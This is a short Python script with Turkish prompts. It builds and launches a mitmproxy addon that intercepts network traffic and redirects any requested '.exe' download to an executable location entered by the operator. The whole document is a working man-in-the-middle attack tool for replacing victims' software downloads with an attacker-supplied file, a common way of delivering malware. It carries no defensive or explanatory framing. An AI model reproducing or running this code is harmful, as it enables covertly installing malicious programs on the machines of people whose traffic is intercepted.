import os
import mitmproxy

exeyoll=input("Exe indirme yolunu giriniz: ")

with open("exeyol.txt","w") as dosya:
	dosya.write(exeyoll)
	



with open("a.py", "w") as dosya:
    dosya.write('''
import mitmproxy
import os

with open("exeyol.txt","r") as dosya:
	exeyol=dosya.read()

def request(flow):
    if flow.request.host != exeyol and flow.request.pretty_url.endswith("exe"):
        flow.response = mitmproxy.http.Response.make(301, "", {"Location": exeyol})

print(exeyol)
''')
os.system("./mitmdump -s a.py")
